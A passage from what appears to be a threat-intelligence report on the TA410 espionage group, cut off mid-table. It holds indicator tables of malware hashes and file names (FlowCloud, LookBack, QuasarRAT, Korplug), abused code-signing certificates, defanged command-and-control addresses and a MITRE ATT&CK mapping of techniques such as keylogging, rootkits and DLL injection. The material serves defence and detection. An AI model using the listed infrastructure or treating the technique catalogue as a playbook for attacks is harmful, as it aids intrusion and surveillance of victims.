+<td class="column-1">C96558312FBF5847351B0B6F724D7B3A31CCAF03</td><td class="column-2">N/A</td><td class="column-3">Win32/Agent.UWR</td><td class="column-4">FlowCloud v5.0.3 initial loader.</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1">1403241C415A8D686B1148FA4229A2EB833D8D08</td><td class="column-2">setlangloc.dll</td><td class="column-3">Win32/Agent.UNL</td><td class="column-4">FlowCloud DLL hijacking malicious library.</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1">38D0E92AFF991CFC9C68D7BAAD6CB85916139AF5</td><td class="column-2">hidmouse.sys</td><td class="column-3">Win32/Agent.UKR</td><td class="column-4">TA410 32-bit Rootkit/Keylogger driver.</td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1">AF978ED8AD37CE1437A6B42D96BF518D5C4CFD19</td><td class="column-2">hidmouse.sys</td><td class="column-3">Win64/Agent.UKR</td><td class="column-4">TA410 64-bit Rootkit/Keylogger driver.</td>
+</tr>
+<tr class="row-6 even">
+<td class="column-1">B70F3A3A9B5B8506EE95791469CA496E01AD7DAF</td><td class="column-2">winver32.dll</td><td class="column-3">Win32/Agent.ULH</td><td class="column-4">FlowCloud v4.1.3 hcClientLoaderZero_x86 backdoor.</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1">014421BDB1EA105A6DF0C27FC114819FF3637704</td><td class="column-2">hhh.exe</td><td class="column-3">Win32/Agent.ABYK</td><td class="column-4">FlowCloud v4.1.3 initial loader.</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-1">EA298866E5A61FEEA4D062987F23B10A78C8A4CA</td><td class="column-2">N/A</td><td class="column-3">Win32/Agent.ULH</td><td class="column-4">FlowCloud v4.1.3 backdoor.</td>
+</tr>
+<tr class="row-9 odd">
+<td class="column-1">021B9E2E8AA30B29569254C0378A9F43E4F32EEC</td><td class="column-2">winver64.dll</td><td class="column-3">Win64/Agent.KM</td><td class="column-4">FlowCloud v4.1.3 hcClientLoaderZero_x64 backdoor.</td>
+</tr>
+<tr class="row-10 even">
+<td class="column-1">2A2F08FAD6B0A86DC94885224687D954E739CC21</td><td class="column-2">N/A</td><td class="column-3">Win32/ParanoidFish.A</td><td class="column-4">Pafish sandbox detection tool.</td>
+</tr>
+<tr class="row-11 odd">
+<td class="column-1">3658B7CCA13C8C8AD03E9B6AEFE4B9CBE48E3C81</td><td class="column-2">hidmouse.sys</td><td class="column-3">Win64/Agent.UKR</td><td class="column-4">TA410 Rootkit/Keylogger driver.</td>
+</tr>
+<tr class="row-12 even">
+<td class="column-1">517488F6BD0E7FC9EDE82F37226A75212B277E21</td><td class="column-2">hidmouse.sys</td><td class="column-3">Win64/Agent.UKR</td><td class="column-4">TA410 Rootkit/Keylogger driver.</td>
+</tr>
+<tr class="row-13 odd">
+<td class="column-1">C05B4AD7A3322917E17710842FB88A090198D51F</td><td class="column-2">N/A</td><td class="column-3">Win32/Agent.TWI</td><td class="column-4">LookBack trojanized libcurl loader.</td>
+</tr>
+<tr class="row-14 even">
+<td class="column-1">DB2DF1BDF8145CB8ABA3A2026A3CC3EF4F1762BE</td><td class="column-2">phx.dll</td><td class="column-3">Win32/Agent.TWI</td><td class="column-4">LookBack trojanized libcurl loader.</td>
+</tr>
+<tr class="row-15 odd">
+<td class="column-1">EDE2AB811311FC011B1E89C5A0B7A60C123B7398</td><td class="column-2">hidmouse.sys</td><td class="column-3">Win64/Agent.UKR</td><td class="column-4">TA410 Rootkit/Keylogger driver.</td>
+</tr>
+<tr class="row-16 even">
+<td class="column-1">7AA35BA7030AFCD271436DE8173D7B2F317A1BFC</td><td class="column-2">libcurl.dll</td><td class="column-3">Win32/Agent.TWI</td><td class="column-4">LookBack trojanized libcurl loader.</td>
+</tr>
+<tr class="row-17 odd">
+<td class="column-1">A5C02ABE698300F3DE0B7CC7F0856652753831DA</td><td class="column-2">libcurl.dll</td><td class="column-3">Win32/Agent.TWI</td><td class="column-4">LookBack trojanized libcurl loader.</td>
+</tr>
+<tr class="row-18 even">
+<td class="column-1">613C4AFAE8F5F80F22DCD1827E3230FCA361ADA5</td><td class="column-2">libcurl.dll</td><td class="column-3">Win32/Agent.UKD</td><td class="column-4">LookBack trojanized libcurl loader.</td>
+</tr>
+<tr class="row-19 odd">
+<td class="column-1">859CD6DFDADAB3D6427C6C1C29581CB2094D648F</td><td class="column-2">meterpreter.exe</td><td class="column-3">Win32/Rozena.CP</td><td class="column-4">Metasploit Meterpreter backdoor.</td>
+</tr>
+<tr class="row-20 even">
+<td class="column-1">DBEA7F0C0D2BF8BC365A2D1572CA1538FE8FB9A3</td><td class="column-2">responsor.dat</td><td class="column-3">Win32/Agent.ULL</td><td class="column-4">FlowCloud fcClientDLL final stage backdoor.</td>
+</tr>
+<tr class="row-21 odd">
+<td class="column-1">ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20</td><td class="column-2">絆邧坋蔡趕口昴.doc </td><td class="column-3">Win32/Exploit.Agent.TY</td><td class="column-4">Malicious Royal Road document.</td>
+</tr>
+<tr class="row-22 even">
+<td class="column-1">7BA42061568FF6D9CA5FE5360DCE74C25EA48ADA</td><td class="column-2">N/A</td><td class="column-3">Win32/Agent.ACKQ</td><td class="column-4">Packed Tendyron downloader.</td>
+</tr>
+<tr class="row-23 odd">
+<td class="column-1">D81215890703C48B8EA07A1F50FEC1A6CA9DF88B</td><td class="column-2">N/A</td><td class="column-3">Win32/TrojanDownloader.Agent.FLI</td><td class="column-4">Unpacked Tendyron downloader.</td>
+</tr>
+<tr class="row-24 even">
+<td class="column-1">F359D3C074135BBCA9A4C98A6B6544690EDAE93D</td><td class="column-2">OnKeyToken_KEB.dll</td><td class="column-3">Win32/Injector.ELGA</td><td class="column-4">Tendyron malicious DLL. </td>
+</tr>
+<tr class="row-25 odd">
+<td class="column-1">621B31D5778EC2FB72D38FB61CED110A6844D094</td><td class="column-2">N/A</td><td class="column-3">Win64/Rozena.AO</td><td class="column-4">X4 network shellcode.</td>
+</tr>
+<tr class="row-26 even">
+<td class="column-1">BC11DC8D86A457A07CFE46B5F2EF6598B83C8A1F</td><td class="column-2">m.exe</td><td class="column-3">Win32/Injector.EMVA</td><td class="column-4">Korplug dropper.</td>
+</tr>
+<tr class="row-27 odd">
+<td class="column-1">C369E1466F66744AA0E658588E7CF2C051EE842F</td><td class="column-2">qrt.dll</td><td class="column-3">Win32/Injector.EMVA</td><td class="column-4">Korplug loader.</td>
+</tr>
+<tr class="row-28 even">
+<td class="column-1">B868764C46BADC152667E9128375BA4F8D936559</td><td class="column-2">qrt.dll.usb</td><td class="column-3">N/A</td><td class="column-4">Korplug encrypted payload.</td>
+</tr>
+<tr class="row-29 odd">
+<td class="column-1">BDECA89B4F39E6702CE6CBBC9E6D69F6BBAB01C8</td><td class="column-2">N/A</td><td class="column-3">N/A</td><td class="column-4">Korplug decrypted payload.</td>
+</tr>
+<tr class="row-30 even">
+<td class="column-1">5379FBB0E02694C524463FDF7F267A7361ECDD68</td><td class="column-2">sll.exe</td><td class="column-3">MSIL/TrojanDownloader.Agent.GPS</td><td class="column-4">QuasarRAT downloader.</td>
+</tr>
+<tr class="row-31 odd">
+<td class="column-1">6CC6170977327541F8185288BB9B1B81F56D3FD0</td><td class="column-2">PresentationCache.exe</td><td class="column-3">MSIL/Agent.TZG</td><td class="column-4">QuasarRAT loader.</td>
+</tr>
+<tr class="row-32 even">
+<td class="column-1">D95185A4A3F8512D92F69D2ED7B8743638C54BE8</td><td class="column-2">N/A</td><td class="column-3">MSIL/Spy.Agent.AES</td><td class="column-4">QuasarRAT backdoor.</td>
+</tr>
+<tr class="row-33 odd">
+<td class="column-1">BE7F0E41CD514561AED43B07AA9F5F0842BF876C</td><td class="column-2">HTra.exe</td><td class="column-3">Win32/HackTool.Hucline.AB</td><td class="column-4">HUC Packet Transmitter (HTran).</td>
+</tr>
+<tr class="row-34 even">
+<td class="column-1">7F663F50E9D6376715AEB3AB66DEDE038258EF6C</td><td class="column-2">HTran13.exe</td><td class="column-3">Win32/HackTool.Hucline.S</td><td class="column-4">HUC Packet Transmitter (HTran).</td>
+</tr>
+<tr class="row-35 odd">
+<td class="column-1">BEDA1224B3BB9F98F95FF7757D2687F4D9F4B53A</td><td class="column-2">event.exe</td><td class="column-3">Win32/Agent.UJN</td><td class="column-4">Simple cmd.exe-based backdoor compiled with MingW.</td>
+</tr>
+<tr class="row-36 even">
+<td class="column-1">2B61E7C63A0A33AAC4CF7FE0CEB462CF6DACC080</td><td class="column-2">htran.exe</td><td class="column-3">Win32/HackTool.Hucline.AB</td><td class="column-4">HUC Packet Transmitter (HTran).</td>
+</tr>
+<tr class="row-37 odd">
+<td class="column-1">EF3C796652141B8A68DCCF488159E96903479C29</td><td class="column-2">htran_f-secury.exe</td><td class="column-3">Win32/HackTool.Hucline.AB</td><td class="column-4">HUC Packet Transmitter (HTran).</td>
+</tr>
+<tr class="row-38 even">
+<td class="column-1">6B547C244A3086B5B6EA2B3A0D9594BBE54AE06B</td><td class="column-2">inbt.zip</td><td class="column-3">Python/HackTool.Agent.J</td><td class="column-4">EXE masquerading as ZIP. This is a Python network scanner (compiled with PyInstaller).</td>
+</tr>
+<tr class="row-39 odd">
+<td class="column-1">4CDCE3AF614C2A5E60E71F1205812AB129C0955B</td><td class="column-2">msd017.exe</td><td class="column-3">Python/Exploit.MS17-010.B</td><td class="column-4">This is a Python scanner (compiled with PyInstaller) for the vulnerability MS17-010 (EternalBlue).</td>
+</tr>
+</tbody>
+</table>
+<h3>Certificates</h3>
+<table class="tablepress tablepress-id-1128" id="tablepress-1128">
+<tbody class="row-hover">
+<tr class="row-1 odd">
+<td class="column-1">Serial number </td><td class="column-2">0F8B600FF1882E</td>
+</tr>
+<tr class="row-2 even">
+<td class="column-1">Thumbprint</td><td class="column-2">02ED6A578C575C8D9C72398E790354B095BB07BC</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1">Subject CN</td><td class="column-2">Hangzhou Leishite Laser Technology Co., Ltd.</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1">Subject O</td><td class="column-2">Hangzhou Leishite Laser Technology Co., Ltd.</td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1">Subject L</td><td class="column-2">Hangzhou</td>
+</tr>
+<tr class="row-6 even">
+<td class="column-1">Subject S</td><td class="column-2">Zhejiang</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1">Subject C</td><td class="column-2">CN</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-1">Valid from</td><td class="column-2">2012-03-29 09:07:04 UTC</td>
+</tr>
+<tr class="row-9 odd">
+<td class="column-1">Valid to</td><td class="column-2">2014-04-02 06:24:19 UTC</td>
+</tr>
+</tbody>
+</table>
+<table class="tablepress tablepress-id-1129" id="tablepress-1129">
+<tbody class="row-hover">
+<tr class="row-1 odd">
+<td class="column-1">Serial number </td><td class="column-2">4ED8730F4E1B8558CD1CB0107B5F776B</td>
+</tr>
+<tr class="row-2 even">
+<td class="column-1">Thumbprint</td><td class="column-2">850821D88A4475F0310F10FBA806353A4113D252</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1">Subject CN</td><td class="column-2">北京和 赢讯时 科技有限公司 (translation: Beijing Heyingxunshi Technology Co., Ltd.)</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1">Subject O</td><td class="column-2">北京和 赢讯时 科技有限公司 (translation: Beijing Heyingxunshi Technology Co., Ltd.)</td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1">Subject OU</td><td class="column-2">研 发 部 ( R&amp;D Department)</td>
+</tr>
+<tr class="row-6 even">
+<td class="column-1">Subject S</td><td class="column-2">北京市 (Beijing)</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1">Subject C</td><td class="column-2">CN</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-1">Valid from</td><td class="column-2">2019-11-13 00:00:00 UTC</td>
+</tr>
+<tr class="row-9 odd">
+<td class="column-1">Valid to</td><td class="column-2">2020-11-12 23:59:59 UTC</td>
+</tr>
+</tbody>
+</table>
+<h3>Network</h3>
+<table class="tablepress tablepress-id-1130" id="tablepress-1130">
+<thead>
+<tr class="row-1 odd">
+<th class="column-1">Domain</th><th class="column-2">IP</th><th class="column-3">First seen</th><th class="column-4">Details</th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
+<td class="column-1"></td><td class="column-2">43.254.216[.]104</td><td class="column-3">2020-06</td><td class="column-4">Delivery server</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1"></td><td class="column-2">45.124.115[.]103</td><td class="column-3">2020-08</td><td class="column-4">Delivery server</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1"></td><td class="column-2">161.82.181[.]4</td><td class="column-3">2020-12</td><td class="column-4">Delivery server</td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1"></td><td class="column-2">43.254.219[.]153</td><td class="column-3">2020-07</td><td class="column-4">X4 C&amp;C server</td>
+</tr>
+<tr class="row-6 even">
+<td class="column-1"></td><td class="column-2">154.223.141[.]36</td><td class="column-3">2020-06</td><td class="column-4">HTran C&amp;C server</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1"></td><td class="column-2">103.139.2[.]93</td><td class="column-3">2020-10</td><td class="column-4">Tendyron C&amp;C server</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-1">cahe.microsofts[.]com</td><td class="column-2"></td><td class="column-3"></td><td class="column-4">QuasarRAT C&amp;C server</td>
+</tr>
+<tr class="row-9 odd">
+<td class="column-1">ffca.caibi379[.]com</td><td class="column-2"></td><td class="column-3"></td><td class="column-4">QuasarRAT downloader C&amp;C server</td>
+</tr>
+<tr class="row-10 even">
+<td class="column-1">smtp.nsfwgo[.]com</td><td class="column-2"></td><td class="column-3"></td><td class="column-4">Korplug C&amp;C server</td>
+</tr>
+<tr class="row-11 odd">
+<td class="column-1"></td><td class="column-2">45.124.115[.]103</td><td class="column-3">2020-06</td><td class="column-4">LookBack C&amp;C server</td>
+</tr>
+<tr class="row-12 even">
+<td class="column-1"></td><td class="column-2">185.225.19[.]17</td><td class="column-3">2021-01</td><td class="column-4">LookBack C&amp;C server</td>
+</tr>
+<tr class="row-13 odd">
+<td class="column-1"></td><td class="column-2">94.158.245[.]249</td><td class="column-3">2020-03</td><td class="column-4">LookBack C&amp;C server</td>
+</tr>
+<tr class="row-14 even">
+<td class="column-1"></td><td class="column-2">5.252.179[.]227</td><td class="column-3">2021-03</td><td class="column-4">LookBack C&amp;C server</td>
+</tr>
+<tr class="row-15 odd">
+<td class="column-1"></td><td class="column-2">222.186.151[.]141</td><td class="column-3">2019-11</td><td class="column-4">FlowCloud C&amp;C server</td>
+</tr>
+<tr class="row-16 even">
+<td class="column-1"></td><td class="column-2">47.111.22[.]65</td><td class="column-3">2020-09</td><td class="column-4">FlowCross C&amp;C server</td>
+</tr>
+<tr class="row-17 odd">
+<td class="column-1"></td><td class="column-2">114.55.109[.]199</td><td class="column-3">2020-05</td><td class="column-4">FlowCloud C&amp;C server</td>
+</tr>
+<tr class="row-18 even">
+<td class="column-1">dlaxpcmghd[.]com</td><td class="column-2">185.225.17[.]39</td><td class="column-3">2020-09</td><td class="column-4">LookBack C&amp;C server</td>
+</tr>
+<tr class="row-19 odd">
+<td class="column-1">wwww.dlmum[.]com</td><td class="column-2"></td><td class="column-3">N/A</td><td class="column-4">FlowCloud C&amp;C server</td>
+</tr>
+</tbody>
+</table>
+<h2>MITRE ATT&amp;CK techniques</h2>
+<p>This table was built using <a href="https://attack.mitre.org/resources/versions/">version 9</a> of the MITRE ATT&amp;CK framework.</p>
+<table class="tablepress tablepress-id-1131" id="tablepress-1131">
+<thead>
+<tr class="row-1 odd">
+<th class="column-1">Tactic</th><th class="column-2">ID</th><th class="column-3">Name</th><th class="column-4">Description</th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
+<td class="column-1" rowspan="3">Resource Development</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1587/001/" rel="noopener" target="_blank">T1587.001</a></td><td class="column-3">Develop Capabilities: Malware</td><td class="column-4">TA410 develops LookBack and FlowCloud.</td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1588/003" rel="noopener" target="_blank">T1588.003</a></td><td class="column-3">Obtain Capabilities: Code Signing Certificates</td><td class="column-4">TA410 uses stolen code-signing certificates.</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1588/005/" rel="noopener" target="_blank">T1588.005</a></td><td class="column-3">Obtain Capabilities: Exploits</td><td class="column-4">TA410 had exploits for ProxyLogon and ProxyShell.</td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1" rowspan="2">Initial Access</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1190/" rel="noopener" target="_blank">T1190</a></td><td class="column-3">Exploit Public-Facing Application</td><td class="column-4">TA410 has exploited web server vulnerabilities for initial access.</td>
+</tr>
+<tr class="row-6 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1566/001/" rel="noopener" target="_blank">T1566.001</a></td><td class="column-3">Phishing: Spearphishing Attachment</td><td class="column-4">TA410 uses malicious RTF and DOCX attachments to compromise victims.</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1" rowspan="5">Execution</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1106/" rel="noopener" target="_blank">T1106</a></td><td class="column-3">Native API</td><td class="column-4">FlowCloud makes extensive use of the Windows API to execute commands and launch processes.</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1129/" rel="noopener" target="_blank">T1129</a></td><td class="column-3">Shared Modules</td><td class="column-4">TA410’s backdoors can load DLLs and execute their payloads.</td>
+</tr>
+<tr class="row-9 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1203/" rel="noopener" target="_blank">T1203</a></td><td class="column-3">Exploitation for Client Execution</td><td class="column-4">TA410 uses Royal Road RTF documents to compromise victims.</td>
+</tr>
+<tr class="row-10 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1559/001/" rel="noopener" target="_blank">T1559.001</a></td><td class="column-3">Inter-Process Communication: Component Object Model</td><td class="column-4">FlowCloud uses COM interfaces to schedule tasks and perform WMI queries.</td>
+</tr>
+<tr class="row-11 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1047" rel="noopener" target="_blank">T1047</a></td><td class="column-3">Windows Management Instrumentation</td><td class="column-4">TA410 uses WMI for lateral movement and information gathering.</td>
+</tr>
+<tr class="row-12 even">
+<td class="column-1" rowspan="3">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1053/005/" rel="noopener" target="_blank">T1053.005</a></td><td class="column-3">Scheduled Task/Job: Scheduled Task</td><td class="column-4">FlowCloud creates a scheduled task for persistence.</td>
+</tr>
+<tr class="row-13 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1505/003/" rel="noopener" target="_blank">T1505.003</a></td><td class="column-3">Server Software Component: Web Shell</td><td class="column-4">TA410 plants webshells on vulnerable web servers.</td>
+</tr>
+<tr class="row-14 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1543/003/" rel="noopener" target="_blank">T1543.003</a></td><td class="column-3">Create or Modify System Process: Windows Service</td><td class="column-4">FlowCloud can be configured to create a service for persistence.</td>
+</tr>
+<tr class="row-15 odd">
+<td class="column-1" rowspan="14">Defense Evasion</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1027/" rel="noopener" target="_blank">T1027</a></td><td class="column-3">Obfuscated Files or Information</td><td class="column-4">FlowCloud files are distributed and stored in encrypted form.</td>
+</tr>
+<tr class="row-16 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1036/004/" rel="noopener" target="_blank">T1036.004</a></td><td class="column-3">Masquerading: Masquerade Task or Service</td><td class="column-4">The driver component of FlowCloud masquerades as a mouse driver service.</td>
+</tr>
+<tr class="row-17 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1036/005/" rel="noopener" target="_blank">T1036.005</a></td><td class="column-3">Masquerading: Match Legitimate Name or Location</td><td class="column-4">Files named after legitimate utilities are written into the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ subdirectory.</td>
+</tr>
+<tr class="row-18 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1014/" rel="noopener" target="_blank">T1014</a></td><td class="column-3">Rootkit</td><td class="column-4">FlowCloud uses a rootkit to hide its network traffic and processes from system utilities.</td>
+</tr>
+<tr class="row-19 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1055.001/" rel="noopener" target="_blank">T1055.001</a></td><td class="column-3">Process Injection: Dynamic-link Library Injection</td><td class="column-4">FlowCloud uses both regular and reflective DLL injection. It also manually loads some DLLs, bypassing calls to LoadLibrary.</td>
+</tr>
+<tr class="row-20 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1055/" rel="noopener" target="_blank">T1055</a></td><td class="column-3">Process Injection</td><td class="column-4">TA410’s backdoors perform process injection to masquerade as harmless processes.</td>
+</tr>
+<tr class="row-21 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1055/003/" rel="noopener" target="_blank">T1055.003</a></td><td class="column-3">Process Injection: Thread Execution Hijacking</td><td class="column-4">One of FlowCloud’s DLLs replaces instructions in the loading process to make it execute code written in its memory.</td>
+</tr>
+<tr class="row-22 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1055/012/" rel="noopener" target="_blank">T1055.012</a></td><td class="column-3">Process Injection: Process Hollowing</td><td class="column-4">FlowCloud uses module stomping to hide the loading of its main backdoor.</td>
+</tr>
+<tr class="row-23 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1140/" rel="noopener" target="_blank">T1140</a></td><td class="column-3">Deobfuscate/Decode Files or Information</td><td class="column-4">Multiple TA410 backdoors communicate with their C&amp;C through encrypted and obfuscated channels.</td>
+</tr>
+<tr class="row-24 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1574/002/" rel="noopener" target="_blank">T1574.002</a></td><td class="column-3">Hijack Execution Flow: DLL Side-Loading</td><td class="column-4">FlowCloud uses DLL Side-Loading to launch its second-stage dropper.</td>
+</tr>
+<tr class="row-25 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1497/" rel="noopener" target="_blank">T1497</a></td><td class="column-3">Virtualization/Sandbox Evasion</td><td class="column-4">Some versions of FlowCloud use the Pafish utility to detect virtualization, sandboxes, and debuggers.</td>
+</tr>
+<tr class="row-26 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1134/002/" rel="noopener" target="_blank">T1134.002</a></td><td class="column-3">Access Token Manipulation: Create Process with Token</td><td class="column-4">FlowCloud can create processes using tokens acquired from legitimate processes.</td>
+</tr>
+<tr class="row-27 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1070/004" rel="noopener" target="_blank">T1070.004</a></td><td class="column-3">Indicator Removal on Host: File Deletion</td><td class="column-4">FlowCloud deletes its rootkit’s executable after launching it.</td>
+</tr>
+<tr class="row-28 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1070.006/" rel="noopener" target="_blank">T1070.006</a></td><td class="column-3">Indicator Removal on Host: Timestomp</td><td class="column-4">FlowCloud backdates some files and services to 2013.</td>
+</tr>
+<tr class="row-29 odd">
+<td class="column-1" rowspan="8">Discovery</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1010/" rel="noopener" target="_blank">T1010</a></td><td class="column-3">Application Window Discovery</td><td class="column-4">When logging mouse events, FlowCloud gathers information about the application running in the foreground.</td>
+</tr>
+<tr class="row-30 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1057/" rel="noopener" target="_blank">T1057</a></td><td class="column-3">Process Discovery</td><td class="column-4">Multiple TA410 backdoors can list running processes.</td>
+</tr>
+<tr class="row-31 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1518" rel="noopener" target="_blank">T1518</a></td><td class="column-3">Software Discovery</td><td class="column-4">FlowCloud uses the IShellAppManager COM object to list installed software.</td>
+</tr>
+<tr class="row-32 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1083/" rel="noopener" target="_blank">T1083</a></td><td class="column-3">File and Directory Discovery</td><td class="column-4">FlowCloud can search through connected file systems and obtain directory listings.</td>
+</tr>
+<tr class="row-33 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1120/" rel="noopener" target="_blank">T1120</a></td><td class="column-3">Peripheral Device Discovery</td><td class="column-4">FlowCloud can list connected camera devices.</td>
+</tr>
+<tr class="row-34 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1016/" rel="noopener" target="_blank">T1016</a></td><td class="column-3">System Network Configuration Discovery</td><td class="column-4">FlowCloud can discover and use locally configured proxies.</td>
+</tr>
+<tr class="row-35 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1012/" rel="noopener" target="_blank">T1012</a></td><td class="column-3">Query Registry</td><td class="column-4">FlowCloud components use registry keys to signal each other.</td>
+</tr>
+<tr class="row-36 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1115/" rel="noopener" target="_blank">T1115</a></td><td class="column-3">Clipboard Data</td><td class="column-4">FlowCloud registers a listener to steal clipboard data when it is changed.</td>
+</tr>
+<tr class="row-37 odd">
+<td class="column-1" rowspan="11">Collection</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1056" rel="noopener" target="_blank">T1056</a></td><td class="column-3">Input Capture</td><td class="column-4">FlowCloud logs mouse clicks.</td>
+</tr>
+<tr class="row-38 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1056/001" rel="noopener" target="_blank">T1056.001</a></td><td class="column-3">Input Capture: Keylogging</td><td class="column-4">FlowCloud records keystrokes.</td>
+</tr>
+<tr class="row-39 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1113" rel="noopener" target="_blank">T1113</a></td><td class="column-3">Screen Capture</td><td class="column-4">FlowCloud takes screenshots at regular intervals.</td>
+</tr>
+<tr class="row-40 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1125" rel="noopener" target="_blank">T1125</a></td><td class="column-3">Video Capture</td><td class="column-4">FlowCloud uses OpenCV to take pictures using connected camera devices.</td>
+</tr>
+<tr class="row-41 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1123" rel="noopener" target="_blank">T1123</a></td><td class="column-3">Audio Capture</td><td class="column-4">FlowCloud has audio capture functionality.</td>
+</tr>
+<tr class="row-42 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1119/" rel="noopener" target="_blank">T1119 </a></td><td class="column-3">Automated Collection</td><td class="column-4">FlowCloud automatically collects data based on timers and events.</td>
+</tr>
+<tr class="row-43 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1074/001/" rel="noopener" target="_blank">T1074.001</a></td><td class="column-3">Data Staged: Local Data Staging</td><td class="column-4">FlowCloud stores collected data in local SQLite databases prior to exfiltration.</td>
+</tr>
+<tr class="row-44 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1005/" rel="noopener" target="_blank">T1005</a></td><td class="column-3">Data from Local System</td><td class="column-4">FlowCloud can exfiltrate files from local file systems.</td>
+</tr>
+<tr class="row-45 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1025/" rel="noopener" target="_blank">T1025</a></td><td class="column-3">Data from Removable Media</td><td class="column-4">FlowCloud can exfiltrate files from removable drives.</td>
+</tr>
+<tr class="row-46 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1560/002/" rel="noopener" target="_blank">T1560.002</a></td><td class="column-3">Archive Collected Data: Archive via Library</td><td class="column-4">FlowCloud and LookBack use a statically linked zlib library to compress data.</td>
+</tr>
+<tr class="row-47 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1560/003/" rel="noopener" target="_blank">T1560.003</a></td><td class="column-3">Archive Collected Data: Archive via Custom Method</td><td class="column-4">FlowCloud compresses some collected data by removing duplicates and similar screen captures.</td>
+</tr>
+<tr class="row-48 even">
+<td class="column-1" rowspan="5">Command And Control</td><td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1071/001/" rel="noopener" target="_blank">T1071.001</a></td><td class="column-3">Application Layer Protocol: Web Protocols</td><td class="column-4">LookBack and FlowCloud can send and receive data over HTTP.</td>
+</tr>
+<tr class="row-49 odd">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1095/" rel="noopener" target="_blank">T1095</a></td><td class="column-3">Non-Application Layer Protocol</td><td class="column-4">LookBack can communicate over raw TCP sockets.</td>
+</tr>
+<tr class="row-50 even">
+<td class="column-2"><a href="https://attack.mitre.org/versions/v9/techniques/T1132/001" rel="noopener" target="_blank">T1132.001</a></td><td class="column-3">Data Encoding: Standard Encoding</td><td class="column-4">FlowCloud uses Protobuf to encode C&amp;C commands and configuration.</td>
+</tr>
+<tr class="row-51 odd">
